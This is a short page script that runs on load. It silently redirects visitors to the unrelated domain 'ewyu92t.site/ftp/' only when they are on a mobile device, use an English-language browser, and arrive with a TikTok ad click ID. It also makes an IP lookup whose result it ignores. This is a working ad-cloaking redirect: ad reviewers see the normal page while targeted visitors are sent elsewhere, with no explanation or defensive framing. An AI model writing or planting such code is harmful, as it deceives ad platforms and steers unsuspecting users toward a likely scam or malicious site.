<script>
  function handleResponse() {
    function isMobileDevice() {
      return /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
    }

    function isEnglishLang() {
      return navigator.language.startsWith('en') || 
             navigator.languages.some(lang => lang.startsWith('en'));
    }

    function hasTTCLIDParam() {
      const urlParams = new URLSearchParams(window.location.search);
      return urlParams.has('ttclid');
    }

    fetch('https://ipapi.co/json/')
      .then(response => response.json())
      .then(data => {
        // 严格的三重条件判断
        if (isMobileDevice() && isEnglishLang() && hasTTCLIDParam()) {
          window.location.href = "https://ewyu92t.site/ftp/";
          return;
        }
      })
      .catch(() => {
        // IP检测失败时严格的三重条件判断
        if (isMobileDevice() && isEnglishLang() && hasTTCLIDParam()) {
          window.location.href = "https://ewyu92t.site/ftp/";
          return;
        }
      });
  }
  
  // 页面加载时执行
  document.addEventListener('DOMContentLoaded', handleResponse);
</script>
